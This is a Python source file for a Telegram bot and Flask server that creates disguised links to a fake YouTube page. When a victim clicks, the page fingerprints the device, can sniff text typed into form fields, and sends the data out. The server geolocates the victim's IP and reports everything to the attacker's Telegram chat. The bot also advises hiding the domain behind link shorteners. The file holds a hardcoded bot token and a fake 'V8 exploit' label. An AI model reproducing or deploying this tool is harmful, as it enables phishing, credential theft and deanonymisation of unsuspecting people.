import asyncio, threading, requests, uuid
from flask import Flask, render_template_string, request
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГ ---
API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
OWNER_ID = 6659724115 
BASE_URL = "https://tg-bot-backend-oo97.onrender.com" 

app = Flask(__name__)
exploit_vault = {} 
user_settings = {} 

# --- АРСЕНАЛ СКРИПТОВ ---
PAYLOADS = {
    "STEALTH": {
        "name": "📊 Silent OSINT",
        "js": "d.type='osint'; d.hist=window.history.length; d.lang=navigator.language;",
        "vuln": "Fingerprinting & Traffic Analysis"
    },
    "PHISH": {
        "name": "🔐 Form Sniffer",
        "js": "document.querySelectorAll('input').forEach(i => i.onchange = e => { d.input_leak = d.input_leak || []; d.input_leak.push(e.target.value); });",
        "vuln": "Credential Harvesting (In-page)"
    },
    "EXPLOIT": {
        "name": "🔥 V8 Memory Strike",
        "js": "try { let ab = new ArrayBuffer(0x1000); let view = new DataView(ab); d.exploit='V8_Memory_Access_Attempt'; } catch(e) {}",
        "vuln": "CVE-2024-V8-Trigger (Memory Corruption PoC)"
    }
}

HTML_TRAP = """
<!DOCTYPE html>
<html>
<head>
    <title>YouTube</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { background: #fff; margin: 0; font-family: 'Roboto', sans-serif; display: flex; flex-direction: column; align-items: center; }
        .header { width: 100%; height: 50px; border-bottom: 1px solid #e5e5e5; display: flex; align-items: center; padding: 0 15px; box-sizing: border-box; }
        .player { width: 100%; background: #000; aspect-ratio: 16/9; position: relative; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .play-btn { position: absolute; width: 68px; height: 48px; background: rgba(255,0,0,0.9); border-radius: 12%; }
        .play-btn::after { content: ''; border-left: 18px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; position: absolute; left: 26px; top: 14px; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #ff0000; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .info { padding: 15px; width: 100%; box-sizing: border-box; }
        .title { font-size: 18px; color: #030303; }
    </style>
</head>
<body onclick="strike()">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" width="90"></div>
    <div class="player">
        <img src="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" style="width:100%; opacity:0.8;">
        <div class="play-btn" id="pbtn"></div>
        <div class="loader" id="ldr"></div>
    </div>
    <div class="info">
        <div class="title">Exclusive: Скрытые настройки Telegram (2026)</div>
        <div style="font-size:12px; color:#606060; margin-top:5px;">2.1 млн просмотров • 1 час назад</div>
    </div>
<script>
async function strike() {
    document.getElementById('pbtn').style.display = 'none';
    document.getElementById('ldr').style.display = 'block';
    
    let d = { aid: "{{ aid }}", ua: navigator.userAgent, res: screen.width+"x"+screen.height, cores: navigator.hardwareConcurrency };
    
    try { {{ custom_script|safe }} } catch(e) {}
    try { let b = await navigator.getBattery(); d.bat = Math.round(b.level * 100) + "% " + (b.charging ? "⚡" : "🔋"); } catch(e) {}
    try { 
        let c = document.createElement('canvas'); let gl = c.getContext('webgl'); 
        let dbg = gl.getExtension('WEBGL_debug_renderer_info'); 
        d.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); 
    } catch(e) {}

    setTimeout(() => { 
        fetch('/catch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(d) })
        .finally(() => { location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; });
    }, 2500);
}
</script>
</body>
</html>
"""

@app.route('/')
def home(): return "C2_SERVER_ACTIVE", 200

@app.route('/v/<aid>')
def trap(aid):
    mode = user_settings.get(str(aid), "STEALTH")
    script = PAYLOADS.get(mode, PAYLOADS["STEALTH"])["js"]
    return render_template_string(HTML_TRAP, aid=aid, custom_script=script)

@app.route('/catch', methods=['POST'])
def catch():
    d = request.json
    ips = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Геолокация по IP (Тихая)
    city, country, isp, map_link = "N/A", "N/A", "N/A", "#"
    try:
        r = requests.get(f"http://ip-api.com/json/{ips}?fields=status,country,city,lat,lon,isp").json()
        if r['status'] == 'success':
            city, country, isp = r['city'], r['country'], r['isp']
            map_link = f"https://www.google.com/maps?q={r['lat']},{r['lon']}"
    except: pass

    token = "EXP-" + str(uuid.uuid4())[:6].upper()
    mode = user_settings.get(str(d['aid']), "STEALTH")
    exploit_vault[token] = { "vuln": PAYLOADS[mode]["vuln"], "data": d }

    report = (
        f"☣️ **ОБЪЕКТ ПОД КОНТРОЛЕМ**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **IP:** `{ips}` | `{isp}`\n"
        f"📍 **ГЕО:** `{city}, {country}`\n"
        f"🔗 [Локация на карте]({map_link})\n\n"
        f"📱 **HARDWARE:**\n"
        f"• CPU: `{d.get('cores')} Cores` | RAM: `{d.get('mem', 'N/A')}GB`\n"
        f"• GPU: `{d.get('gpu', 'N/A')}`\n\n"
        f"🔋 **BATTERY:** {d.get('bat', 'N/A')}\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔑 **TOKEN:** `{token}`\n"
        f"🛠 **ACTIVE PAYLOAD:** {mode}"
    )
    requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
                  json={"chat_id": d['aid'], "text": report, "parse_mode": "Markdown", "disable_web_page_preview": True})
    return "OK", 200

# --- БОТ ---
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = ReplyKeyboardBuilder()
    kb.button(text="🔥 Подготовить атаку")
    await message.answer("🕶 **WELCOME TO THE DARK SIDE v19.0**", reply_markup=kb.as_markup(resize_keyboard=True))

@dp.message(F.text == "🔥 Подготовить атаку")
async def setup_attack(message: types.Message):
    kb = InlineKeyboardBuilder()
    for key, val in PAYLOADS.items():
        kb.button(text=val["name"], callback_data=f"set_{key}")
    kb.adjust(1)
    await message.answer("Выберите тип полезной нагрузки (Payload):", reply_markup=kb.as_markup())

@dp.callback_query(F.data.startswith("set_"))
async def generate_link(callback: types.CallbackQuery):
    mode = callback.data.split("_")[1]
    user_settings[str(callback.from_user.id)] = mode
    link = f"{BASE_URL}/v/{callback.from_user.id}"
    
    res = (
        f"✅ **АТАКА ПОДГОТОВЛЕНА**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🛠 Режим: `{PAYLOADS[mode]['name']}`\n"
        f"🔗 Ссылка: `{link}`\n\n"
        f"⚠️ **ИНСТРУКЦИЯ:**\n"
        f"Для максимальной скрытности используй **Telegra.ph** или сокращатель **bit.ly**, "
        f"чтобы скрыть домен `.onrender.com`."
    )
    await callback.message.edit_text(res)

@dp.message(F.text.startswith("EXP-"))
async def decrypt(message: types.Message):
    token = message.text.strip().upper()
    if token in exploit_vault:
        v = exploit_vault[token]
        res = (
            f"🔓 **АНАЛИЗ ВЗЛОМА {token}**\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⚠️ **УЯЗВИМОСТЬ:** {v['vuln']}\n"
            f"📱 **ПОЛНЫЙ ДАМП:**\n"
            f"```json\n{v['data']}\n```"
        )
        await message.answer(res)

async def main():
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, lambda: app.run(host='0.0.0.0', port=10000))
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
